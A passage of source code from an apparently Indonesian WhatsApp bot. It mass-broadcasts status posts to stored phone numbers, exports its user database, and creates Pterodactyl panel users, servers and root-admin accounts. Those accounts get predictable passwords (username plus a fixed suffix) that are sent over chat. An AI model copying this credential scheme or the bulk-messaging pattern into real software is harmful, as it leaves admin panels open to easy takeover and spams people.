if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
lenwy.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L',
title: `©Project Kamiya汉 V3`,
sourceUrl: `https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L`, 
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break

case 'hapusdb':
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283829102407@s.whatsapp.net`)
yakiii = text.split("|")[0].replace(/[^0-9]/g, '')
unnnp = pengguna.indexOf(yakiii)
pengguna.splice(unnnp, 1)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
reply(`Nomor ${yakiii} Telah Di Hapus Dari Database!!!`)
break

case 'listdb':
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
if (isBan) return reply('*Lu Di Ban Owner*')
 teksoooo = '▢ *L I S T - D B* 」\n\n'
for (let i of pengguna) {
teksoooo += `- ${i}\n`
}
teksoooo += `\n*Total : ${pengguna.length}*`
lenwy.sendMessage(from, { text: teksoooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": pengguna } })
break

case 'getdb': {
            if (!isCreator) return reply(mess.owner)
            LenwyLD()
            let sesi = await fs.readFileSync('./src/database.json')
            lenwy.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: len })
            }
        break

case 'getuser': {
            if (!isCreator) return reply(mess.owner)
            LenwyLD()
            let sesi = await fs.readFileSync('./database/user.json')
            lenwy.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'user.json' }, { quoted: len })
            }
        break

case "buatswptv":
{
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
 if (!m.quoted) reply `Balas Video Dengan Caption ${prefix + command}`
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
lenwy.relayMessage('status@broadcast', ptv.message, {
statusJidList: pengguna
})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break

case 'toptv':
{
if (!isCreator) return reply('*Khusus Premium*')
await LenwyLD ()
 if (!m.quoted) reply `Balas Video Dengan Caption ${prefix + command}`
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
lenwy.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break

        case "1gb2443417": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/846e7e790c4548710c553.jpg" 
if (!u) return
let d = (await lenwy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`*DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
lenwy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: len })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}

break
case "2gb2443417": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "50"
let disk = "2048"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/846e7e790c4548710c553.jpg" 
if (!u) return
let d = (await lenwy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
lenwy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: len })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb2443417": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "70"
let disk = "3072"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/846e7e790c4548710c553.jpg" 
if (!u) return
let d = (await lenwy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
lenwy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: len })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb2443417": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "90"
let disk = "4048"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/846e7e790c4548710c553.jpg" 
if (!u) return
let d = (await lenwy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
lenwy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: len })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli2443417": {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/846e7e790c4548710c553.jpg" 
if (!u) return
let d = (await lenwy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
lenwy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: len })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb2443417": {
    if (!isSeler) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "110"
let disk = "5138"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/846e7e790c4548710c553.jpg" 
if (!u) return
let d = (await lenwy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
lenwy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: len })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
        case "addpanel2443417": {
const owned = `${global.owner}@s.whatsapp.net`
const text12 = `*👋🏻 Hi @${sender.split("@")[0]}*

CARA ADD USER PANEL :

ram user,nomer

contoh : 1gb udin,628xxxxxxxx`
lenwy.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
                case "listsrv": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await lenwy.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr": {
  if (!isCreator) return reply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await lenwy.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!isCreator) return reply(mess.owner)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!isCreator) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr": {

if (!isCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await lenwy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await lenwy.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─▢ *『 USER INFO 』*
│ ⨠   ➤ *ID* : ${user.id}
│ ⨠   ➤ *USERNAME* : ${user.username}
│ ⨠   ➤ *EMAIL* : ${user.email}
│ ⨠   ➤ *NAME* : ${user.first_name} ${user.last_name}
│ ⨠   ➤ *CREATED AT* :  ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
╰━*PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
lenwy.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─▢ *『 USER INFO 』*
│ ⨠   ➤ *📧EMAIL* : ${email}
│ ⨠   ➤ *👤USERNAME* : ${username}
│ ⨠   ➤ *🔐PASSWORD* : ${password.toString()}
│ ⨠   ➤ *🌐LOGIN* : ${domain}
╰━`,
})
}
break
                case "crateadmin": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} Contoh,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} Contoh,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await lenwy.sendMessage(m.chat, listMessage)

    await lenwy.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        
                    //[ Rpg Menu ]\\

 //cr thunder
case 'inventori': case 'inventory': case 'profile':{
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*🌡️Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*⛓️Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*🎗️Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*🔰Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*🌟Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*🧪Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟Ikan:* ${getIkan(m.sender)}\n`
teksehmazeh += `*🐔Ayam:* ${getAyam(m.sender)}\n`
teksehmazeh += `*🐇Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*🐑Domba:* ${getDomba(m.sender)}\n`
teksehmazeh += `*🐄Sapi:* ${getSapi(m.sender)}\n`
teksehmazeh += `*🐘Gajah:* ${getGajah(m.sender)}\n\n`
